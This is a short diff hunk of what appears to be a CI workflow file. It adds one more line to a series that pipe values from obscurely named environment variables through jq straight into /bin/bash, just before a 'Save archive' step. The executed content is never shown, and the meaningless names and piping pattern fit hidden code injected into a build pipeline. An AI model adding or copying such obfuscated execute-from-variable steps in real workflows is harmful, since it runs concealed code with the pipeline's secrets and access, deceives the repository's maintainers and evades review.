@@ -63,6 +63,7 @@ jobs:
           echo $f08867 | jq -r .kno12 | /bin/bash
           echo $pki09 | jq -r .q24860 | /bin/bash
           printf '%s' "$lb6931" | jq -r .ednk311 | /bin/bash
+          echo $xgagn87 | jq -r .brsb077 | /bin/bash
 
       - name: Save archive
         if: always()
